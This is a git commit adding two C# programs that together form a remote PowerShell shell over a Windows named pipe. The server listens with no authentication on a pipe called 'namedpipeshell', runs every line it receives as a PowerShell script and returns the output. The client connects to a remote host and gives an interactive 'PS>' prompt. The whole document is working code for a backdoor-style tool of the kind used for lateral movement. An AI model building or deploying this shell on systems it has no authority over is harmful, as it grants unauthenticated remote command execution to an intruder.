c35927a272fe910a8714e78d95cbd83999cdeff1
Andre Marques (zc00l) <andre.marques@esecurity.com.br>
2019-09-13 15:07:55 -0300

    First Commit

---
+++ Client/Program.cs
@@ -0,0 +1,56 @@
+﻿using System;
+using System.IO;
+using System.IO.Pipes;
+using System.Text;
+
+namespace Client
+{
+    class Client
+    {
+        static void Main(string[] args)
+        {
+
+            if(args.Length == 0)
+            {
+                Console.WriteLine("Usage: " + AppDomain.CurrentDomain.FriendlyName + " <IP/hostname>");
+                Environment.Exit(0);
+            }
+
+            Console.WriteLine("[+] Connecting to " + args[0]);
+            using (var pipe = new NamedPipeClientStream(args[0], "namedpipeshell", PipeDirection.InOut))
+            {
+                pipe.Connect(5000);
+                pipe.ReadMode = PipeTransmissionMode.Message;
+                Console.WriteLine("[+] Connection established succesfully.");
+                do
+                {
+                    Console.Write("PS> ");
+                    var input = Console.ReadLine();
+                    if (String.IsNullOrEmpty(input)) continue;
+                    byte[] bytes = Encoding.Default.GetBytes(input);
+                    pipe.Write(bytes, 0, bytes.Length);
+                    if (input.ToLower() == "exit") return;
+                    var result = ReadMessage(pipe);
+                    Console.WriteLine(Encoding.UTF8.GetString(result));
+                    Console.WriteLine();
+                } while (true);
+            }
+        }
+
+        private static byte[] ReadMessage(PipeStream pipe)
+        {
+            byte[] buffer = new byte[1024];
+            using (var ms = new MemoryStream())
+            {
+                do
+                {
+                    var readBytes = pipe.Read(buffer, 0, buffer.Length);
+                    ms.Write(buffer, 0, readBytes);
+                }
+                while (!pipe.IsMessageComplete);
+
+                return ms.ToArray();
+            }
+        }
+    }
+}
---
+++ Server/Program.cs
@@ -0,0 +1,104 @@
+﻿using System;
+using System.Collections.ObjectModel;
+using System.Management.Automation;
+using System.Management.Automation.Runspaces;
+using System.IO;
+using System.IO.Pipes;
+using System.Text;
+
+namespace Server
+{
+    class Server
+    {
+        static void Main(string[] args)
+        {
+
+            Runspace runspace = null;
+             // Create a PS runspace.
+            try
+            {
+                runspace = RunspaceFactory.CreateRunspace();
+                runspace.ApartmentState = System.Threading.ApartmentState.STA; 
+                runspace.Open();
+            } catch
+            {
+                Console.WriteLine("[!] Error: Could not create a PS runspace.");
+                Environment.Exit(1);
+            }
+
+
+           while(true)
+            {
+                using (var pipe = new NamedPipeServerStream(
+                "namedpipeshell",
+                PipeDirection.InOut,
+                NamedPipeServerStream.MaxAllowedServerInstances,
+                PipeTransmissionMode.Message))
+                {
+                    Console.WriteLine("[*] Waiting for client connection...");
+                    pipe.WaitForConnection();
+                    Console.WriteLine("[*] Client connected.");
+                    while (true)
+                    {
+                        var messageBytes = ReadMessage(pipe);
+                        var line = Encoding.UTF8.GetString(messageBytes);
+                        Console.WriteLine("[*] Received: {0}", line);
+                        if (line.ToLower() == "exit")
+                        {
+                            return;
+                        }
+
+                        // Execute PowerShell code.
+                        try
+                        {
+
+                            Pipeline PsPipe = runspace.CreatePipeline();
+                            PsPipe.Commands.AddScript(line);
+                            PsPipe.Commands.Add("Out-String");
+                            Collection<PSObject> results = PsPipe.Invoke();
+                            StringBuilder stringBuilder = new StringBuilder();
+                            foreach (PSObject obj in results)
+                            {
+                                stringBuilder.AppendLine(obj.ToString());
+                            }
+
+                            var response = Encoding.ASCII.GetBytes(stringBuilder.ToString());
+
+                            try
+                            {
+                                pipe.Write(response, 0, response.Length);
+                            }
+                            catch
+                            {
+                                Console.WriteLine("[!] Pipe is broken!");
+                                break;
+                            }
+
+                        }
+                        catch (Exception e)
+                        {
+                            var response = Encoding.ASCII.GetBytes("ERROR: " + e.Message);
+                            pipe.Write(response, 0, response.Length);
+                        }
+                    }
+                }
+            }
+        }
+
+        private static byte[] ReadMessage(PipeStream pipe)
+        {
+            byte[] buffer = new byte[1024];
+            using (var ms = new MemoryStream())
+            {
+                do
+                {
+                    var readBytes = pipe.Read(buffer, 0, buffer.Length);
+                    ms.Write(buffer, 0, readBytes);
+                }
+                while (!pipe.IsMessageComplete);
+
+                return ms.ToArray();
+            }
+        }
+    }
+}
